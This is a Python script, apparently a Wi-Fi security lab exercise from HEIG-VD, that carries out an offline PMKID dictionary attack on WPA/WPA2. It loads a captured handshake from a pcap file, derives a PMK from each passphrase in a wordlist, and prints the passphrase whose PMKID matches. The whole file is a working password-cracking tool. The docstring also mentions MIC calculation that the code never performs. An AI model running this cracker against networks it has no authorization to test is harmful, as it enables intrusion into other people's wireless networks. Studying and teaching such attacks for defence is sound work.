#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"
__modified_by__ = "Blanc Jean-Luc & Plancherel Noémie"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]



wpa=rdpcap("PMKID_handshake.pcap") 
wordlist = "wordlist.txt"
name = b"PMK Name"
ssid = wpa[0].info.decode('utf-8')
APmac = a2b_hex(wpa[145].addr2.replace(':',''))
Clientmac = a2b_hex(wpa[145].addr1.replace(':',''))
pmkid_expected = wpa[145].original[-20:-4]
data = name + APmac + Clientmac


print ("\n\nValues used to derivate keys")
print ("============================")
print ("Dictionary: ",wordlist,"\n")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("PMK msg: ",b2a_hex(data),"\n")


passphrases = open(wordlist, "r")

for passphrase in passphrases:
	passphrase = passphrase.strip('\n')
	
	pmk = pbkdf2(hashlib.sha1, str.encode(passphrase), ssid.encode(), 4096, 32)
	
	pmkid = hmac.new(pmk, data, hashlib.sha1)
	print("###############")
	print("Passphrase being tested : ", passphrase)
	print("pmkid expected : ", pmkid_expected.hex())
	print("pmkid          : ", pmkid.hexdigest()[:-8])
	if pmkid.hexdigest()[:-8] != pmkid_expected.hex():
		continue
	print("Passphrase found : ", passphrase)
	break




